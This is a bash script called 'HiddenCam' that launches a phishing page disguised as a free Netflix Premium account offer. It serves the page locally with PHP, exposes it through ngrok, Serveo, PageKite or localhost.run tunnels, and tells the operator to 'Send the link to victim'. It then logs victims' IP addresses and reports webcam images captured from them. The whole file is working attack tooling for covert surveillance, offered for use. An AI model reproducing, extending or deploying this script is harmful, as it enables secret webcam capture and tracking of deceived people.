#!/bin/bash

trap 'printf "\n";stop' 2
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
req() {

command -v php > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
command -v python2 > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }

if [[ -e .www/.cam.log ]]; then
rm -rf .www/.cam.log
fi

if [[ -e .www/.servlink ]]; then
rm -rf .www/.servlink
fi
}
banner() {

clear
printf "\e[1;33m  _    _ _     _     _             \e[1;32m  _____                 \e[0m\n"
printf "\e[1;33m | |  | (_)   | |   | |            \e[1;32m / ____|                \e[0m\n"
printf "\e[1;33m | |__| |_  __| | __| | ___ _ __   \e[1;32m| |     __ _ _ __ ___   \e[0m\n"
printf "\e[1;33m |  __  | |/ _  |/ _  |/ _ \  _ \  \e[1;32m| |    / _  |  _   _ \  \e[0m\n"
printf "\e[1;33m | |  | | | (_| | (_| |  __/ | | | \e[1;32m| |___| (_| | | | | | | \e[0m\n"
printf "\e[1;33m |_|  |_|_|\__,_|\__,_|\___|_| |_| \e[1;32m \_____\__,_|_| |_| |_| \e[0m\n"
printf " \n"
printf "\e[0m\e[1;93m    Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;92mTahmid Rayat\e[0m\e[1;91m)\e[0m\n"
printf " \n"

}
menu() {
d_o_server="03"

printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Serveo\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m03\e[0m\e[1;91m]\e[0m\e[1;93m PageKite\e[0m\n"
printf " \e[0m\e[1;91m[\e[0m\e[1;97m04\e[0m\e[1;91m]\e[0m\e[1;93m LocalHost.Run\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
start_ngrok
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_serveo
elif [[ $option_server == 3 || $option_server == 03 ]]; then
start_pagekite
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local

else
printf "\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
saveip() {

ip=$(grep -a 'IP:' .www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m IP:\e[0m\e[1;96m %s\e[0m\n" $ip
cat .www/ip.txt >> ~/hiddencam/victim-ip.txt

}
victimfound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victims ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do

if [[ -e ".www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !!\n"
saveip
rm -rf .www/ip.txt

fi

sleep 0.5

if [[ -e ".www/.cam.log" ]]; then
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
rm -rf .www/.cam.log
fi
sleep 0.5

done 

}

start_ngrok() {

if [[ -e .www/ngrok ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
else
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok...\e[0m\n"
cd .www/ && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./.www/ngrok http 5555 > /dev/null 2>&1 &
sleep 8
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link


}

start_serveo() {

default_choose_sub="Y"
default_subdomain="netflix$RANDOM"
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Want Custom Subdomain? (Default:\e[0m\e[1;77m \e[1;31m[\e[1;33mY\e[1;31m/\e[1;33mn\e[1;31m]\e[1;32m : \e[0m\e[1;96m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input your Subdomain: (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

start_serveo2
}
start_serveo2() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:$port serveo.net  2> /dev/null > .www/.servlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > .www/.servlink ' &

sleep 8
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo...\e[0m\n"
fuser -k $port/tcp > /dev/null 2>&1
cd .www/ && php -S localhost:$port > /dev/null 2>&1 &
sleep 3
serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
banner
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
printf "\n"


}

start_pagekite() {
if [[ -e .www/.pagekite ]]; then
echo ""
else
curl -o .www/.pagekite https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
fi

pagekite_def_sub="netflix$RANDOM"
pagekite_def_port="5555"
pagekite_choose_subdef="Y"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $pagekite_def_port
read pagekite_port
pagekite_port="${pagekite_port:-${pagekite_def_port}}"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Want Custom Subdomain? (Default:\e[0m\e[1;77m \e[1;31m[\e[1;33mY\e[1;31m/\e[1;33mn\e[1;31m]\e[1;32m : \e[0m\e[1;96m'
read pagekite_choose_sub
pagekite_choose_sub="${pagekite_choose_sub:-${pagekite_choose_subdef}}"
if [[ $pagekite_choose_sub == "Y" || $pagekite_choose_sub == "y" || $pagekite_choose_sub == "Yes" || $pagekite_choose_sub == "yes" ]]; then
pagekite_subdomain_resp=true
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input your Subdomain: (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $pagekite_def_sub
read pagekite_subdomain
pagekite_subdomain="${pagekite_subdomain:-${pagekite_def_sub}}"
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$pagekite_port\e[0m\e[1;92m)\e[0m\n"
sleep 2
clear
banner
printf "\n\e[1;33m\t  Read This Very Carefully !\e[0m\n\n"
printf " \e[1;31m[\e[1;37m01\e[1;31m]\e[1;33m Use a Temporary Email Address.\e[1;31m(\e[1;36mtempail.com\e[1;31m)\e[0m\n\n"
printf " \e[1;31m[\e[1;37m02\e[1;31m]\e[1;33m Sometime it Requires Email verification.\e[0m\n\n"
printf " \e[1;31m[\e[1;37m03\e[1;31m]\e[1;33m Press CTRL + C To Stop Tunneling.\e[0m\n\n"
printf " \e[1;31m[\e[1;37m04\e[1;31m]\e[1;33m You can see the Images only After Stopping Tunneling.\e[0m\n\n"
printf "\e[0m\n"
printf "\e[1;33m      Press Enter to Start Tunnelling\e[0m\n"
read enter
sleep 1
printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>" > .www/index.php

fuser -k $pagekite_port/tcp > /dev/null 2>&1
cd .www/ && php -S localhost:$pagekite_port > /dev/null 2>&1 &

if [[ $pagekite_subdomain_resp == true ]]; then
sleep 1
python2 .www/.pagekite --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
else
sleep 1
python2 .www/.pagekite --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
fi


}

banner
req
menu
victimfound
